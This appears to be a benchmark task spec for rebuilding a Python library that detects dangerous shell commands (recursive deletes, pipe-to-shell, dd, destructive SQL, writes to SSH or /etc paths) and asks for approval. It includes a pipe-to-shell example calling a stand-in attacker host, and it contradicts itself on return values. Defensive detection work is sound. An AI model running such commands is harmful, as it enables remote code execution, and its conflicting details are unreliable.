# approval

## Overview

The `approval` library is a Python module comprising 877 lines of code organized into a single source module that implements a comprehensive dangerous command detection and approval system. At its core, the library provides pattern-based detection of potentially hazardous commands, interactive user prompting for approval decisions, and thread-safe per-session state management. The module serves as the centralized authority for all dangerous command handling, exposing 31 module-level functions and a single class to manage the complete approval workflow.

The library's primary responsibilities include command pattern matching against a predefined set of dangerous command patterns (via `DANGEROUS_PATTERNS` and the `detect_dangerous_command` function), interactive approval prompting to obtain user consent before executing flagged commands, and maintaining thread-safe approval state indexed by session keys. This architecture enables the library to track approval decisions across multiple concurrent sessions without race conditions, allowing applications to cache approval decisions and avoid redundant prompts within the same session context.

The `approval` module is designed as a foundational component for security-conscious applications that need to gate execution of potentially destructive operations. By centralizing dangerous command detection logic and approval state management in a single module, the library provides a reliable, auditable mechanism for controlling access to sensitive operations while maintaining session-aware context throughout the approval lifecycle.

# Natural Language Instructions for Rebuilding the `approval` Library

## Implementation Constraints

- **Single module file**: All code must live in `/home/ubuntu/workspace/approval.py`
- **No external private packages**: Do not attempt to import `hermes_cli` or other repo-internal modules; recreate needed behavior locally
- **Exact signatures**: Use the function and method signatures provided verbatim—do not rename parameters, change defaults, or alter return types
- **Thread-safe state**: Use `contextvars` for session key binding and thread-safe locks for shared approval dictionaries
- **Config integration**: Mock or stub `hermes_cli.config.load_config()` calls; the module must handle missing config gracefully
- **Pattern detection**: Implement regex-based dangerous command detection with support for multi-line commands (backslash continuations)
- **Backwards compatibility**: Support legacy approval key aliases for pattern matching

---

## Behavioral Requirements

### 1. **Context-Local Session Key Management**
   - `set_current_session_key(session_key: str) -> contextvars.Token[str]` must bind a session key to the current async context using `contextvars.ContextVar` and return a token for later restoration.
   - `reset_current_session_key(token: contextvars.Token[str]) -> None` must restore the prior session key context using the token.
   - `get_current_session_key(default: str = "default") -> str` must return the context-local session key if set, otherwise fall back to the `HERMES_SESSION_KEY` environment variable, then the provided default.

### 2. **Dangerous Command Detection**
   - `detect_dangerous_command(command: str) -> tuple` must return a 3-tuple: `(is_dangerous: bool, pattern_key: str | None, description: str | None)`.
   - Detection must identify patterns including:
     - `rm -r`, `rm -rf`, `rm --recursive` (recursive deletion)
     - `bash -c`, `bash -lc`, `ksh -c`, `sh -c` (shell code execution)
     - `curl | sh`, `wget | bash` (piped shell execution)
     - `dd if=...` (disk operations)
     - `DROP TABLE`, `DELETE FROM ... (without WHERE)` (SQL destructive operations)
   - Safe commands like `rm readme.txt`, `rm -f readme.txt`, `echo`, `ls`, `git` must return `(False, None, None)`.
   - Multi-line commands with backslash continuations must be normalized and detected correctly.
   - `_normalize_command_for_detection(command: str) -> str` must collapse multi-line commands (replace `\\\n` with space) before pattern matching.

### 3. **Pattern Key and Alias Resolution**
   - `_legacy_pattern_key(pattern: str) -> str` must reproduce the old regex-derived approval key for backwards compatibility (used when loading old config).
   - `_approval_key_aliases(pattern_key: str) -> set[str]` must return all approval keys that should match a given pattern (e.g., both "rm" and legacy variants).

### 4. **Per-Session Approval State**
   - `approve_session(session_key: str, pattern_key: str)` must store approval for a pattern within a session (thread-safe).
   - `is_approved(session_key: str, pattern_key: str) -> bool` must check if a pattern is approved in the session OR in the permanent allowlist.
   - `clear_session(session_key: str)` must remove all session approvals and pending requests for that session.
   - Internal state must use thread-safe locks (e.g., `threading.Lock`) to protect shared dictionaries.

### 5. **Pending Approval Requests**
   - `submit_pending(session_key: str, approval: dict)` must store a pending approval request (blocking) for a session.
   - `pop_pending(session_key: str) -> Optional[dict]` must retrieve and remove the pending approval, returning `None` if none exists.
   - `has_pending(session_key: str) -> bool` must return `True` if a session has a pending approval.
   - `_ApprovalEntry` class must wrap approval data with `__slots__` for memory efficiency.

### 6. **Permanent Allowlist Management**
   - `load_permanent(patterns: set)` must bulk-load pattern keys into the permanent allowlist.
   - `approve_permanent(pattern_key: str)` must add a single pattern to the permanent allowlist.
   - `load_permanent_allowlist() -> set` must read permanently allowed patterns from config (via `hermes_cli.config.load_config()`).
   - `save_permanent_allowlist(patterns: set)` must persist the permanent allowlist to config.

### 7. **Gateway Approval Callbacks**
   - `register_gateway_notify(session_key: str, cb) -> None` must register a per-session callback for sending approval requests to the user.
   - `unregister_gateway_notify(session_key: str) -> None` must unregister the callback.
   - `resolve_gateway_approval(session_key: str, choice: str, resolve_all: bool = False) -> int` must process approval/denial choices from the gateway and return a count of resolved approvals.
   - `has_blocking_approval(session_key: str) -> bool` must check if a session has one or more blocking gateway approvals waiting.
   - `pending_approval_count(session_key: str) -> int` must return the number of pending blocking approvals.

### 8. **Approval Mode and Configuration**
   - `_get_approval_mode() -> str` must read the approval mode from config and return one of: `"manual"`, `"smart"`, or `"off"`.
   - `_normalize_approval_mode(mode) -> str` must normalize mode values (e.g., `False` → `"off"`, `True` → `"manual"`, string values as-is).
   - `_get_approval_config() -> dict` must read the full `approvals` config block, returning a dict with keys like `'mode'`, `'timeout'`, etc.
   - `_get_approval_timeout() -> int` must read the approval timeout from config, defaulting to 60 seconds.
   - If config is missing or `hermes_cli.config` is unavailable, return sensible defaults (`"off"` mode, 60-second timeout).

### 9. **User Prompting (CLI)**
   - `prompt_dangerous_approval(command: str, description: str, timeout_seconds: int | None = None, allow_permanent: bool = True, approval_callback = None) -> str` must prompt the user to approve a dangerous command.
   - Return value must be one of: `"APPROVE"`, `"DENY"`, or `"HERMES_SPINNER_PAUSE"`.
   - If `timeout_seconds` is provided, enforce a timeout (return `"DENY"` on timeout).
   - If `allow_permanent` is `True`, offer the user an option to permanently approve the pattern.
   - If `approval_callback` is provided, use it instead of direct user input (for testing).

### 10. **Smart Approval (LLM-Based)**
   - `_smart_approve(command: str, description: str) -> str` must use an auxiliary LLM to assess risk and decide approval.
   - Return `"APPROVE"` or `"DENY"` based on LLM assessment.
   - If the LLM is unavailable, fall back to `"DENY"`.

### 11. **Dangerous Command Checking**
   - `check_dangerous_command(command: str, env_type: str, approval_callback = None) -> dict` must check if a command is dangerous and handle approval.
   - Return a dict with keys: `'action'` (one of `"APPROVE"`, `"DENY"`, `"HERMES_SPINNER_PAUSE"`), and optionally `'rule_id'`, `'severity'`, `'summary'`.
   - If approval mode is `"off"`, return `{'action': 'APPROVE'}` immediately.
   - If approval mode is `"smart"`, use `_smart_approve()` to decide.
   - If approval mode is `"manual"`, prompt the user via `prompt_dangerous_approval()`.
   - Respect session-level and permanent approvals.

### 12. **All-Guards Command Checking**
   - `check_all_command_guards(command: str, env_type: str, approval_callback = None) -> dict` must run all pre-exec security checks (including dangerous command detection and any other guards).
   - Return a single approval decision dict with `'action'` and optional metadata.
   - This is the top-level entry point for command security validation.

### 13. **Tirith Integration (Optional)**
   - `_format_tirith_description(tirith_result: dict) -> str` must build a human-readable description from tirith findings (if tirith is available).
   - If tirith is unavailable, return a generic description.

### 14. **Data Structures and Constants**
   - Define `DANGEROUS_PATTERNS` as a dict mapping pattern keys to regex patterns and descriptions.
   - Use string literals as dict keys: `'APPROVE'`, `'DENY'`, `'HERMES_SPINNER_PAUSE'`, `'action'`, `'approvals'`, `'choice'`, `'command_allowlist'`, `'description'`, `'findings'`, `'gateway_timeout'`, `'mode'`, `'rule_id'`, `'severity'`, `'summary'`, `'timeout'`, `'title'`.
   - Maintain thread-safe global state for session approvals, pending requests, and permanent allowlist.

---

## Implementation Steps

1. **Create `/home/ubuntu/workspace/approval.py`** with all required functions and classes.
2. **Import required modules**: `contextvars`, `threading`, `re`, `os`, `sys`, `time`, `typing`, `dataclasses` (or `__slots__`).
3. **Define `DANGEROUS_PATTERNS`** dict with regex patterns for each dangerous command type.
4. **Implement context-local session key binding** using `contextvars.ContextVar`.
5. **Implement thread-safe approval state** using `threading.Lock` for shared dictionaries.
6. **Implement `detect_dangerous_command()`** with multi-line normalization and pattern matching.
7. **Implement approval checking functions** (`is_approved`, `approve_session`, etc.).
8. **Implement config loading** with graceful fallback if `hermes_cli.config` is unavailable.
9. **Implement user prompting** (CLI-based, with timeout support).
10. **Implement smart approval** (LLM-based, with fallback).
11. **Implement gateway callbacks** for async approval workflows.
12. **Write comprehensive docstrings** matching the module docstring and function signatures.
13. **Test all 100 test cases** to ensure correctness.

## Required Tested Symbols

The hidden tests import every symbol listed here. Implement all of them, including underscored/private helpers.

- `def set_current_session_key(session_key: str) -> contextvars.Token[str]`
- `def reset_current_session_key(token: contextvars.Token[str]) -> None`
- `def get_current_session_key(default: str = "default") -> str`
- `def detect_dangerous_command(command: str) -> tuple`
- `def submit_pending(session_key: str, approval: dict)`
- `def pop_pending(session_key: str) -> Optional[dict]`
- `def has_pending(session_key: str) -> bool`
- `def approve_session(session_key: str, pattern_key: str)`
- `def is_approved(session_key: str, pattern_key: str) -> bool`
- `def load_permanent(patterns: set)`
- `def clear_session(session_key: str)`
- `def prompt_dangerous_approval(command: str, description: str, timeout_seconds: int | None = None, allow_permanent: bool = True, approval_callback = None) -> str`
- `def _get_approval_mode() -> str`
- `def check_all_command_guards(command: str, env_type: str, approval_callback = None) -> dict`

## Environment Configuration

### Python Version

Python >=3.11

### Workspace

- Put the implementation directly under `/home/ubuntu/workspace`.
- Your shell may start in a different current directory, so `cd` into the workspace or use paths that write there explicitly.
- Hidden tests import the solution as top-level module file(s): `approval.py`.

### External Dependencies

No third-party runtime dependencies were detected from the source file.

### Internal Helpers (implement locally)

These names came from repo-internal modules. Do NOT try to `pip install` them.

- `agent.auxiliary_client`: repo-private helper module; the original code imported `auxiliary_max_tokens_param`, `get_text_auxiliary_client` from `agent.auxiliary_client`. Recreate the needed behavior locally.
- `hermes_cli.config`: repo-private helper module; the original code imported `load_config`, `save_config` from `hermes_cli.config`. Recreate the needed behavior locally.
- `tools.ansi_strip`: repo-private helper module; the original code imported `strip_ansi` from `tools.ansi_strip`. Recreate the needed behavior locally.
- `tools.tirith_security`: repo-private helper module; the original code imported `check_command_security` from `tools.tirith_security`. Recreate the needed behavior locally.


## Project Directory Structure

```
workspace/
├── pyproject.toml
├── approval.py
```

## API Usage Guide

### 1. Module Import

```python
from approval import (
    set_current_session_key,
    reset_current_session_key,
    get_current_session_key,
    detect_dangerous_command,
    register_gateway_notify,
    unregister_gateway_notify,
    resolve_gateway_approval,
    has_blocking_approval,
    pending_approval_count,
    submit_pending,
    pop_pending,
    has_pending,
    approve_session,
    is_approved,
    approve_permanent,
    load_permanent,
    clear_session,
    load_permanent_allowlist,
    save_permanent_allowlist,
    prompt_dangerous_approval,
    check_dangerous_command,
    check_all_command_guards,
    DANGEROUS_PATTERNS,
)
```

### 2. `_ApprovalEntry` Class

One pending dangerous-command approval inside a gateway session.

```python
class _ApprovalEntry():
    """One pending dangerous-command approval inside a gateway session."""
```

**Class Variables:**
- `__slots__`


```python
def __init__(self, data: dict):
```

**Parameters:**
- `data: dict`

### 3. `set_current_session_key` Function

Bind the active approval session key to the current context.

```python
def set_current_session_key(session_key: str) -> contextvars.Token[str]:
```

**Parameters:**
- `session_key: str`

**Returns:** `contextvars.Token[str]`

### 4. `reset_current_session_key` Function

Restore the prior approval session key context.

```python
def reset_current_session_key(token: contextvars.Token[str]) -> None:
```

**Parameters:**
- `token: contextvars.Token[str]`

**Returns:** `None`

### 5. `get_current_session_key` Function

Return the active session key, preferring context-local state.

```python
def get_current_session_key(default: str = "default") -> str:
```

**Parameters:**
- `default: str = "default"`

**Returns:** `str`

### 6. `detect_dangerous_command` Function

Check if a command matches any dangerous patterns.

Returns:
    (is_dangerous, pattern_key, description) or (False, None, None)

```python
def detect_dangerous_command(command: str) -> tuple:
```

**Parameters:**
- `command: str`

**Returns:** `tuple`

### 7. `register_gateway_notify` Function

Register a per-session callback for sending approval requests to the user.

The callback signature is ``cb(approval_data: dict) -> None`` where
*approval_data* contains ``command``, ``description``, and
``pattern_keys``.  The callback bridges sync→async (runs in the agent
thread, must schedule the actual send on the event loop).

```python
def register_gateway_notify(session_key: str, cb) -> None:
```

**Parameters:**
- `session_key: str`
- `cb`

**Returns:** `None`

### 8. `unregister_gateway_notify` Function

Unregister the per-session gateway approval callback.

Signals ALL blocked threads for this session so they don't hang forever
(e.g. when the agent run finishes or is interrupted).

```python
def unregister_gateway_notify(session_key: str) -> None:
```

**Parameters:**
- `session_key: str`

**Returns:** `None`

### 9. `resolve_gateway_approval` Function

Called by the gateway's /approve or /deny handler to unblock
waiting agent thread(s).

When *resolve_all* is True every pending approval in the session is
resolved at once (``/approve all``).  Otherwise only the oldest one
is resolved (FIFO).

Returns the number of approvals resolved (0 means nothing was pending).

```python
def resolve_gateway_approval(session_key: str, choice: str, resolve_all: bool = False) -> int:
```

**Parameters:**
- `session_key: str`
- `choice: str`
- `resolve_all: bool = False`

**Returns:** `int`

### 10. `has_blocking_approval` Function

Check if a session has one or more blocking gateway approvals waiting.

```python
def has_blocking_approval(session_key: str) -> bool:
```

**Parameters:**
- `session_key: str`

**Returns:** `bool`

### 11. `pending_approval_count` Function

Return the number of pending blocking approvals for a session.

```python
def pending_approval_count(session_key: str) -> int:
```

**Parameters:**
- `session_key: str`

**Returns:** `int`

### 12. `submit_pending` Function

Store a pending approval request for a session.

```python
def submit_pending(session_key: str, approval: dict):
```

**Parameters:**
- `session_key: str`
- `approval: dict`

### 13. `pop_pending` Function

Retrieve and remove a pending approval for a session.

```python
def pop_pending(session_key: str) -> Optional[dict]:
```

**Parameters:**
- `session_key: str`

**Returns:** `Optional[dict]`

### 14. `has_pending` Function

Check if a session has a pending approval request.

```python
def has_pending(session_key: str) -> bool:
```

**Parameters:**
- `session_key: str`

**Returns:** `bool`

### 15. `approve_session` Function

Approve a pattern for this session only.

```python
def approve_session(session_key: str, pattern_key: str):
```

**Parameters:**
- `session_key: str`
- `pattern_key: str`

### 16. `is_approved` Function

Check if a pattern is approved (session-scoped or permanent).

Accept both the current canonical key and the legacy regex-derived key so
existing command_allowlist entries continue to work after key migrations.

```python
def is_approved(session_key: str, pattern_key: str) -> bool:
```

**Parameters:**
- `session_key: str`
- `pattern_key: str`

**Returns:** `bool`

### 17. `approve_permanent` Function

Add a pattern to the permanent allowlist.

```python
def approve_permanent(pattern_key: str):
```

**Parameters:**
- `pattern_key: str`

### 18. `load_permanent` Function

Bulk-load permanent allowlist entries from config.

```python
def load_permanent(patterns: set):
```

**Parameters:**
- `patterns: set`

### 19. `clear_session` Function

Clear all approvals and pending requests for a session.

```python
def clear_session(session_key: str):
```

**Parameters:**
- `session_key: str`

### 20. `load_permanent_allowlist` Function

Load permanently allowed command patterns from config.

Also syncs them into the approval module so is_approved() works for
patterns added via 'always' in a previous session.

```python
def load_permanent_allowlist() -> set:
```

**Returns:** `set`

### 21. `save_permanent_allowlist` Function

Save permanently allowed command patterns to config.

```python
def save_permanent_allowlist(patterns: set):
```

**Parameters:**
- `patterns: set`

### 22. `prompt_dangerous_approval` Function

Prompt the user to approve a dangerous command (CLI only).

Args:
    allow_permanent: When False, hide the [a]lways option (used when
        tirith warnings are present, since broad permanent allowlisting
        is inappropriate for content-level security findings).
    approval_callback: Optional callback registered by the CLI for
        prompt_toolkit integration. Signature:
        (command, description, *, allow_permanent=True) -> str.

Returns: 'once', 'session', 'always', or 'deny'

```python
def prompt_dangerous_approval(command: str, description: str, timeout_seconds: int | None = None, allow_permanent: bool = True, approval_callback = None) -> str:
```

**Parameters:**
- `command: str`
- `description: str`
- `timeout_seconds: int | None = None`
- `allow_permanent: bool = True`
- `approval_callback = None`

**Returns:** `str`

### 23. `check_dangerous_command` Function

Check if a command is dangerous and handle approval.

This is the main entry point called by terminal_tool before executing
any command. It orchestrates detection, session checks, and prompting.

Args:
    command: The shell command to check.
    env_type: Terminal backend type ('local', 'ssh', 'docker', etc.).
    approval_callback: Optional CLI callback for interactive prompts.

Returns:
    {"approved": True/False, "message": str or None, ...}

```python
def check_dangerous_command(command: str, env_type: str, approval_callback = None) -> dict:
```

**Parameters:**
- `command: str`
- `env_type: str`
- `approval_callback = None`

**Returns:** `dict`

### 24. `check_all_command_guards` Function

Run all pre-exec security checks and return a single approval decision.

Gathers findings from tirith and dangerous-command detection, then
presents them as a single combined approval request. This prevents
a gateway force=True replay from bypassing one check when only the
other was shown to the user.

```python
def check_all_command_guards(command: str, env_type: str, approval_callback = None) -> dict:
```

**Parameters:**
- `command: str`
- `env_type: str`
- `approval_callback = None`

**Returns:** `dict`

### 25. Constants and Configuration

```python
_SSH_SENSITIVE_PATH = r'(?:~|\$home|\$\{home\})/\.ssh(?:/|$)'
_HERMES_ENV_PATH = r'(?:~\/\.hermes/|'
    r'(?:\$home|\$\{home\})/\.hermes/|'
    r'(?:\$hermes_home|\$\{hermes_home\})/)'
    r'\.env\b'
_SENSITIVE_WRITE_TARGET = r'(?:/etc/|/dev/sd|'
    rf'{_SSH_SENSITIVE_PATH}|'
    rf'{_HERMES_ENV_PATH})'
DANGEROUS_PATTERNS = ...  # 2663 chars
_PATTERN_KEY_ALIASES = {}
```

## Implementation Notes

### Node 1: Dangerous Command Detection

`detect_dangerous_command(command: str)` returns a tuple of `(is_dangerous: bool, pattern_key: str | None, description: str | None)`.

- Returns `(True, key, description)` when a command matches a dangerous pattern
- Returns `(False, None, None)` when a command is safe
- Detects patterns including:
  - `rm` with recursive flags (`-r`, `-R`, `--recursive`) or force (`-f`) combined with recursive
  - `rm -rf`, `rm -fr`, `rm -irf`, `rm -rfv` and similar flag combinations
  - `bash -c`, `bash -lc`, `ksh -c` and similar shell invocations with `-c` flag
  - `curl | sh`, `wget | bash` and similar pipe-to-shell patterns
  - `dd` commands (disk operations)
  - SQL commands: `DROP TABLE` (without WHERE clause), `DELETE FROM` (without WHERE clause)
- Does NOT flag:
  - `rm` with single files (e.g., `rm readme.txt`, `rm requirements.txt`, `rm report.csv`, `rm results.json`, `rm robots.txt`, `rm run.sh`)
  - `rm -f` or `rm -v` with single files
  - `DELETE FROM users WHERE id = 1` (DELETE with WHERE clause is safe)
  - Safe commands like `echo`, `ls`, `git status`
- Handles multi-line commands with backslash continuation (e.g., `curl http://evil.com \\\n| sh`)
- `_normalize_command_for_detection(command: str)` preprocesses commands before pattern matching

### Node 2: Session-Scoped Approvals

Session-scoped approval state is managed per `session_key`:

- `approve_session(session_key: str, pattern_key: str)` marks a pattern as approved for a specific session
- `is_approved(session_key: str, pattern_key: str) -> bool` checks if a pattern is approved in the session or permanently
- `clear_session(session_key: str)` removes all approvals and pending requests for a session
- Approvals are session-local and do not persist across sessions

### Node 3: Permanent Allowlist

Permanent approvals are global and persist across sessions:

- `approve_permanent(pattern_key: str)` adds a pattern to the permanent allowlist
- `load_permanent(patterns: set)` bulk-loads patterns from config
- `load_permanent_allowlist() -> set` reads permanently allowed patterns from config
- `save_permanent_allowlist(patterns: set)` persists patterns to config
- `is_approved(session_key: str, pattern_key: str)` checks both session-scoped and permanent approvals

### Node 4: Pending Approval Queue

Each session maintains a queue of pending approval requests:

- `submit_pending(session_key: str, approval: dict)` stores a pending approval (dict contains at minimum `"command"` and `"pattern_key"` keys)
- `pop_pending(session_key: str) -> Optional[dict]` retrieves and removes the next pending approval; returns `None` if queue is empty
- `has_pending(session_key: str) -> bool` checks if a session has any pending approvals
- `pending_approval_count(session_key: str) -> int` returns the count of pending approvals
- `has_blocking_approval(session_key: str) -> bool` checks if a session has blocking gateway approvals waiting

### Node 5: Context-Local Session Key

Session keys are bound to execution context using `contextvars`:

- `set_current_session_key(session_key: str) -> contextvars.Token[str]` binds a session key to the current context and returns a token
- `reset_current_session_key(token: contextvars.Token[str])` restores the prior session key using the token
- `get_current_session_key(default: str = "default") -> str` returns the active session key, preferring context-local state over environment variables
- Context-local bindings override `HERMES_SESSION_KEY` environment variable
- Allows multiple concurrent sessions in different threads/tasks to maintain separate approval state

### Node 6: Gateway Approval Callbacks

Gateway integration uses per-session callbacks:

- `register_gateway_notify(session_key: str, cb)` registers a callback for sending approval requests to the user
- `unregister_gateway_notify(session_key: str)` removes the callback
- `resolve_gateway_approval(session_key: str, choice: str, resolve_all: bool = False) -> int` processes approval/denial decisions from the gateway; `choice` is a string (likely `'APPROVE'` or `'DENY'`); returns an int (likely count of resolved approvals)

### Node 7: Approval Mode Configuration

Approval behavior is controlled by config:

- `_get_approval_mode() -> str` returns the approval mode: `'manual'`, `'smart'`, or `'off'`
- `_normalize_approval_mode(mode)` normalizes mode values from YAML/config
- Boolean `False` in YAML maps to `'off'`
- String `'off'` remains `'off'`
- `_get_approval_config() -> dict` reads the full `approvals` config block with keys like `'mode'`, `'timeout'`, etc.
- `_get_approval_timeout() -> int` reads approval timeout from config; defaults to 60 seconds

### Node 8: Approval Decision Workflow

High-level approval checking:

- `check_dangerous_command(command: str, env_type: str, approval_callback = None) -> dict` checks if a command is dangerous and handles approval; returns a dict with approval decision
- `check_all_command_guards(command: str, env_type: str, approval_callback = None) -> dict` runs all pre-exec security checks and returns a single approval decision dict
- `prompt_dangerous_approval(command: str, description: str, timeout_seconds: int | None = None, allow_permanent: bool = True, approval_callback = None) -> str` prompts the user (CLI only) to approve a dangerous command; returns a string (likely `'APPROVE'` or `'DENY'`)
- `_smart_approve(command: str, description: str) -> str` uses an auxiliary LLM to assess risk and decide approval; returns a string decision

### Node 9: Tirith Integration

Security findings from tirith are formatted for display:

- `_format_tirith_description(tirith_result: dict) -> str` builds a human-readable description from tirith findings
- Tirith results are dicts with keys like `'findings'`, `'severity'`, `'summary'`, `'title'`, `'rule_id'`

### Node 10: Approval Entry and Legacy Keys

- `_ApprovalEntry(data: dict)` wraps a pending approval dict; uses `__slots__` for memory efficiency
- `_legacy_pattern_key(pattern: str) -> str` reproduces old regex-derived approval keys for backwards compatibility
- `_approval_key_aliases(pattern_key: str) -> set[str]` returns all approval keys that should match a given pattern (for handling pattern aliases)
- `_PATTERN_KEY_ALIASES = {}` is an empty dict; no aliases are defined in the constants

### Node 11: Sensitive Path Constants

Three regex patterns define sensitive write targets that trigger approval:

- `_SSH_SENSITIVE_PATH = r'(?:~|\$home|\$\{home\})/\.ssh(?:/|$)'` matches `~/.ssh/`, `$home/.ssh/`, `${home}/.ssh/`
- `_HERMES_ENV_PATH = r'(?:~\/\.hermes/|(?:\$home|\$\{home\})/\.hermes/|(?:\$hermes_home|\$\{hermes_home\})/)\b'` matches `.env` files in hermes config directories
- `_SENSITIVE_WRITE_TARGET = r'(?:/etc/|/dev/sd|{_SSH_SENSITIVE_PATH}|{_HERMES_ENV_PATH})'` combines all sensitive paths: `/etc/`, `/dev/sd*`, SSH directories, and Hermes `.env` files